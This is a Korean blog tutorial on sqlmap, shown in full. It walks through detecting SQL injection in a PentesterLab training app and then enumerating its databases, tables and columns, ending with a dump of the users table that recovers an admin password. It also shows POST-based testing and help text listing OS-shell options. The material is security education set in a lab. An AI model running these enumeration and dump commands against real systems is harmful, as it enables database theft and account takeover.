---
title: "SQL Injection 분석도구 SQLMap 사용법"
tags: [database, sqlmap, manual, sql injection, pentesterlab, 웹취약점분석]
author: eli_ez3r
key: 20191025
modify_date: 2019-10-25
article_header:
  type: cover
  image:
    src:
---

<img src="http://eliez3r.synology.me/assets/img/study/db/sqlmap/logo.png" width="600x">

## 0x00. 개요

 **[sqlmap]( http://sqlmap.org/ )(automatic SQL injection and database takeover tool)**은 공개 모의침투 도구로 SQL구문삽입(SQL Injection) 취약점을 탐지/진단하고 데이터베이스에 직간접적으로 접근할 수 있는 취약점 분석 도구이다. 

SQL 구문삽입 공격은 DB 구조 파악이 가장 힘든 작업인데, 수작업으로 진행하기에는 매우 많은 시간이 걸린다. `sqlmap`은 DB 구조파악, 테이블 내용 유출 등을 자동화해주기 떄문에 웹취약점에 대한 수동분석 과정에서 상당히 많은 시간을 절약할 수 있게 도와주는 매우 훌륭한 프로그램이다. 

-----



## 0x01. 설치방법

Linux 시스템에서 다음과 같이 간단하게 설치할 수 있다.

```
apt-get install sqlmap -y
```

-----



## 0x02. 사용법

### (1) 도움말

다음 명령어를 통해서 `sqlmap`에 대한 도움말을 볼 수 있다.(보다 자세한 도움말을 보려면 `sqlmap -hh`)

```
sqlmap -h
```

```
root@ubuntu:~# sqlmap -h
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

-----



## 0x03. 실습

sqlmap 실습을 위해서 [PentesterLab의 From SQL Injection to Shell 훈련장]( https://pentesterlab.com/exercises/from_sqli_to_shell/course )을 대상으로 진행한다.

[경고]실제 서버를 공격하여 생기는 법적 책임은 공격자 본인에게 있음을 경고합니다. 
{:.warning} 

 ![Image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/1.png){:.border.rounded}

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/2.png){:.border.rounded}

SQL Injection to Shell 훈련장의 접속화면이다. 이미지를 보여주는 cat.php의 id변수를 대상으로 sqlmap을 이용하여 SQL Injection 취약점 점검을 진행한다.

SQL Injection 취약점이 존재하면 실제 관리자 계정 탈취까지 가능하다.



### (1) GET 방식 입력 값 점검

다음 명령어를 이용하여 GET방식의 입력값 점검을 할 수 있다.

먼저 URL만을 이용하여 SQL Injection 취약점이 존재하는지 살펴본다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1"
```

 ![img](http://eliez3r.synology.me/assets/img/study/db/sqlmap/3.png){:.border.rounded}  

기본적임 점검에서 id변수가 취약하며, OS정보와 Web Application정보, DBMS정보등을 알아오는 것을 알 수 있다.

> 일반적인 웹 취약점 분석에서는 SQL Injection 취약점 분석을 여기서 중단하여도 무방하다. 하지만, 관리자 페이지 내에 존재하는 취약점 점검 등이 필요한 경우에는 계정정보를 알아내기 위해서 추가적인 DB조회를 계속 진행할 수도 있을 것이다.

일반적으로 sqlmap 분석순서는 다음과 같다.

1. SQL Injection 판별
2. 데이터베이스 목록 조회
3. 테이블 목록 조회
4. 테이블 스키마 조회
5. 테이블 덤프
6. 기타 등등...



사전에 DBMS정보를 알고 있는 경우는 다음 명령어를 사용하면 된다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbms=mysql
```



#### 데이터베이스 목록 조회

다음 명령어를 통해 데이터베이스의 목록을 조회할 수 있다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/4.png){:.border.rounded} 

`--dbs`의 옵션으로 현재 웹 어플리케이션("cat.php")이 접근할 수 있는 MySQL 데이터베이스 이름을 모두 조회하였다. 조회된 데이터 베이스 중 `information_schema`는 MySQL의 시스템 카탈로그(System Catalog)이다. 따라서 이 서비스에서 사용하는 데이터베이스는 `photoblog`임을 알 수 있다.



##### 쿠키값이 필요할 경우(사용 예시)

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" --cookie="security=low; PHPSESSID=letmado2cqoj2vd2i0873168h5; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs
```





#### 테이블 목록 조회

데이터베이스의 이름을 알아내었으니 해당 데이터베이스의 테이블 목록을 조회해보자.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/5.png){:.border.rounded} 

`--tables` 옵션을 사용하여 categories, pictures, users 3개의 테이블 이름을 찾아내었다.



#### 컬럼 목록 조회

회원정보는 users 테이블에 저장되어 있을 것이라고 추정가능 하기에 users 테이블의 칼럼 목록을 조회한다.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/6.png){:.border.rounded} 

users 테이블은 id, login, password 3개 컬럼(column)으로 구성되어 있음을 확인하였다.

이제 이 테이블을 조회하면 id, login, password의 값들을 확인 할수 있을것이다.



#### 테이블 내용 덤프

users테이블의 모든 내용들을 덤프해보자.

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --dump
```

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/7.png){:.border.rounded} 

user는 `admin` 계정이 존재하고 패스워드는 hash값으로 되어있지만, 해당 해쉬값이 P4ssw0rd 임을 알려준다.



만약 수많은 컬럼들이 존재할 때 특정 컬럼만 덤프하고 싶을 것이다. (login, password 칼럼만 덤프)

```
sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users -C "login,password" --dump
```





-----



### (2) POST 방식 입력 값 점검

![image](http://eliez3r.synology.me/assets/img/study/db/sqlmap/8.png){:.border.rounded}

위 그림은 SQL Injection to Shell 훈련장의 관리자 페이지 접속화면이다. ID/PW를 이용하여 로그인하는 페이지이며 POST방식으로 구현되어 있다.

POST방식일 경우 `--data` 옵션을 이용하면된다.

```
sqlmap -u "http://192.168.23.131/admin/index.php" --data "user=USER&password=PASS"
```

-----

